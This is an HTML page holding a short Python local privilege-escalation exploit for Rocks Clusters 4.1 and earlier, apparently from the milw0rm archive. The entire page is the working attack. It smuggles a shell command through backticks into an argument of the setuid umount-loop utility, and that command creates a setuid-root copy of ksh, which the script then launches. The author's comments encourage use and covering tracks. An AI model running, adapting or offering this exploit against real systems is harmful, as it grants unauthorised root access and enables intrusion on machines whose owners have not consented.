<html><head><title>Rocks Clusters <= 4.1 (umount-loop) Local Root Exploit</title></head><pre>#!/usr/bin/env python
##############################################################################
##  rocksumountdirty.py: Rocks release &lt;=4.1 local root exploit
##  quick and nasty version of the exploit. make sure the . is writable and
##  you clean up afterwards. ;)
##
##  coded by: xavier@tigerteam.se [http://xavsec.blogspot.com]
##############################################################################
x=__import__('os');c=x.getcwd()
open('%s/x'%c, 'a').write(&quot;#!/bin/sh\ncp /bin/ksh %s/shell\nchmod a+xs %s/shell\nchown root.root %s/shell\n&quot; % (c,c,c))
print &quot;Rocks Clusters &lt;=4.1 umount-loop local root exploit by xavier@tigerteam.se [http://xavsec.blogspot.com]&quot;
x.system('umount-loop &quot;\`sh %s/x\`&quot;'%c);x.system(&quot;%s/shell&quot;%c)

# milw0rm.com [2006-07-15]</pre></html>